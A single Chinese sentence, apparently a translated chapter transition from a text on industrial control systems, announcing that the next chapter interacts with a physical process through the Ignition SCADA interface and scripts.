  zh: 现在我们已经深入到操作网络的一侧，下一章我们将通过使用Ignition SCADA的用户界面和脚本与物理过程进行交互。
